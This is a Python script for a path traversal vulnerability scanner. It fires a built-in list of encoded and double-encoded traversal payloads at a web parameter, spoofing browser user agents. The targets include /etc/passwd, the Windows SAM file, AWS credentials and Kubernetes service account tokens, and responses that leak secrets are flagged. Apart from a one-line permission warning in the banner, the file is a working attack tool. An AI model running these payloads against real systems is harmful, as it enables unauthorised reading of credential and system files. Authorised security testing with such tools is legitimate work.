import requests
import time
import sys
import random
from urllib.parse import quote

DEFAULT_WORDLIST = [
    "../", "..\\", "/", "\\",
    "%2e%2e%2f", "%2e%2e%5c", "%c0%ae%c0%ae/", "%252e%252e%252f", "%252e%252e%255c",
    "....//", "....\\", "..//..//", "../../..//", "....//....//",
    "../%00", "../../etc/passwd%00", "../../windows/win.ini%00",
    "/etc/passwd", "/var/www/html/config.php", "C:\\Windows\\System32\\config\\SAM", "C:\\Windows\\win.ini",
    "/var/www/.aws/credentials", "/proc/self/root/etc/passwd", "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "../../../../../etc/passwd", "../../../../../windows/system32/drivers/etc/hosts",
    ".././../", "..%2f..%2f..%2f", "....%2f%2f....%2f%2f", "..;../", "..%252f..%252f"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36"
]

def double_encode(payload):
    return quote(quote(payload))

def test_payload(base_url, param, payload, timeout=5):
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Connection": "keep-alive"
        }
        url = f"{base_url}?{param}={payload}"
        response = requests.get(url, headers=headers, timeout=timeout, allow_redirects=False)
        
        status = response.status_code
        content_length = len(response.content)
        content_snippet = response.text[:100].replace('\n', '') if content_length > 0 else "No content"
        
        return {
            "url": url,
            "status": status,
            "length": content_length,
            "snippet": content_snippet
        }
    except requests.RequestException as e:
        return {"url": url, "status": "Error", "length": 0, "snippet": str(e)}

def run_path_traversal_test(base_url, param, wordlist):
    print("[*] Starting Path Traversal Test...")
    print("[*] Target:", base_url)
    print("[*] Parameter:", param)
    print("[*] Total payloads:", len(wordlist) * 2)
    print("-")

    potential_vulns = []

    for payload in wordlist:
        result = test_payload(base_url, param, payload)
        print(f"[>] {result['url']} | Status: {result['status']} | Length: {result['length']} | {result['snippet']}")
        
        if result["status"] == 200 and result["length"] > 0:
            if any(keyword in result["snippet"].lower() for keyword in ["root", "passwd", "config", "aws", "secret"]):
                potential_vulns.append(result)
        
        double_payload = double_encode(payload)
        double_result = test_payload(base_url, param, double_payload)
        print(f"[>] {double_result['url']} | Status: {double_result['status']} | Length: {double_result['length']} | {double_result['snippet']}")
        
        if double_result["status"] == 200 and double_result["length"] > 0:
            if any(keyword in double_result["snippet"].lower() for keyword in ["root", "passwd", "config", "aws", "secret"]):
                potential_vulns.append(double_result)
        
        time.sleep(0.1)

    print("-")
    if potential_vulns:
        print("[!] Potential Vulnerabilities Found:")
        for vuln in potential_vulns:
            print(f"  - URL: {vuln['url']}")
            print(f"    Status: {vuln['status']}, Length: {vuln['length']}, Snippet: {vuln['snippet']}")
    else:
        print("[*] No clear vulnerabilities detected. Check responses manually for subtle leaks.")

def main():
    print("==========================================================")
    print("   Path Traversal Vulnerability Scanner (2025 Edition)   ")
    print("----------------------------------------------------------")
    print("   Developed by Praveen Kavinda")
    print("   Website: https://prav33n.me")
    print("----------------------------------------------------------")
    print("|\ WARNING: Use only on systems you own or have explicit permission to test! /|")
    print("==========================================================")

    base_url = input("Enter the base URL (e.g., http://prav33n.me/download): ").strip()
    param = input("Enter the parameter to test (e.g., file): ").strip()
    custom_wordlist_path = input("Enter custom wordlist file path (leave blank to use default): ").strip()

    if not base_url.startswith("http"):
        print("[!] Error: URL must start with http:// or https://")
        sys.exit(1)
    if not param:
        print("[!] Error: Parameter cannot be empty")
        sys.exit(1)

    wordlist = DEFAULT_WORDLIST
    if custom_wordlist_path:
        try:
            with open(custom_wordlist_path, "r") as f:
                wordlist = [line.strip() for line in f if line.strip()]
            print("[+] Loaded custom wordlist from:", custom_wordlist_path)
        except Exception as e:
            print("[!] Failed to load custom wordlist:", str(e))
            sys.exit(1)

    run_path_traversal_test(base_url, param, wordlist)

if __name__ == "__main__":
    main()
